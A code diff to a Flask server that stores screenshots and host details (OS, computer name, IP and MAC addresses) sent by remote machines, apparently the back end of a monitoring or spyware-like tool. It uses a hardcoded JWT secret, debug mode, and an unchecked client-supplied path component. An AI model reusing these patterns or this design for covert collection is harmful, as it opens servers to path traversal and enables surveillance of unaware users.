@@ -5,6 +5,7 @@ import uuid
 from PIL import Image
 from io import BytesIO
 import os
+import json
 
 app = Flask(__name__)
 app.config['JWT_SECRET_KEY'] = 'super-secret'  
@@ -154,33 +155,50 @@ def receive_screenshot():
         return jsonify({'success': True}), 200
     except Exception as e:
         return jsonify({'error': str(e)}), 500
-    
+
+
+
 @app.route('/api/getbasicinformation', methods=['POST'])
 def getbasicinformation():
     try:
-        data = request.json
+        data = request.get_json()
+        if not data:
+            raise ValueError("Keine JSON-Daten erhalten")
+        
         uuid = data.get('uuid')
-        windows_information = data.get('windows_info')
-        ip_addresses = data.get('ip_addresses')
-        mac_addresses = data.get('mac_addresses')
+        operating_system = data.get('Operation System')
+        computer_name = data.get('Computer Name')
+        ip_addresses = data.get('IP Adresses')
+        mac_addresses = data.get('Mac Adresses')
 
-        SCREENSHOT_FOLDER = 'data'
-        os.makedirs(SCREENSHOT_FOLDER, exist_ok=True)
-        uuid_folder = os.path.join(SCREENSHOT_FOLDER, uuid)
+        basicinformation = {
+            'uuid': uuid,
+            'operating_system': operating_system,
+            'computer_name': computer_name,
+            'ip_addresses': ip_addresses, 
+            'mac_addresses': mac_addresses
+        }
+        print(basicinformation)
+
+        DATA_FOLDER = 'data'
+        os.makedirs(DATA_FOLDER, exist_ok=True)
+        uuid_folder = os.path.join(DATA_FOLDER, uuid)
         os.makedirs(uuid_folder, exist_ok=True)
 
-        screenshots_folder = os.path.join(uuid_folder, 'BasicInformation')
-        os.makedirs(screenshots_folder, exist_ok=True)
+        basicinformation_folder = os.path.join(uuid_folder, 'BasicInformation')
+        os.makedirs(basicinformation_folder, exist_ok=True)
 
+        # Pfad zur Datei "Data.json"
+        data_file_path = os.path.join(basicinformation_folder, 'Data.json')
+
+        # Daten in die Datei schreiben
+        with open(data_file_path, 'w') as file:
+            json.dump(basicinformation, file)
+
+        return jsonify(basicinformation), 200
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
-
-
-    
-
-
-
-
 if __name__ == '__main__':
     app.run(debug=True)
+
